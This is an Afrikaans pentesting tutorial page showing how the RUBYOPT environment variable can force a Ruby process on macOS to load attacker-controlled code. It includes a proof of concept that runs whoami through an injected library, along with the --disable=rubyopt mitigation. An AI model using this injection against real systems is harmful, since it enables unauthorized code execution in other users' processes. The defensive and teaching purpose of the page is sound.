# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby ontleed ondersteunde command-line switches uit die `RUBYOPT`-omgewingsveranderlike voordat dit 'n script uitvoer. Ruby verwerp kode-uitvoering deur middel van `-e` in `RUBYOPT`, maar `-I` kan 'n library-search directory vooraan plaas en `-r` kan 'n library vereis. 'n Proses wat Ruby met aanvaller-beheerde omgewingsveranderlikes begin, kan dus gedwing word om aanvaller-beheerde Ruby-kode te laai.<sup>[[1]](#references)</sup>

Skep `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Skep 'n onskadelike Ruby script soos `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Laat dit loop met ’n beheerde `RUBYOPT`-waarde:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Om hierdie gedrag te deaktiveer, gebruik `--disable=rubyopt` (of `--disable-rubyopt`) **voor** die skripnaam:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
'n Opsie wat na `hello.rb` geskryf word, word in `ARGV` aan die script deurgegee; dit skakel nie Ruby se vroeëre verwerking van `RUBYOPT` uit nie.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## References

- [1] [Ruby-dokumentasie - Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
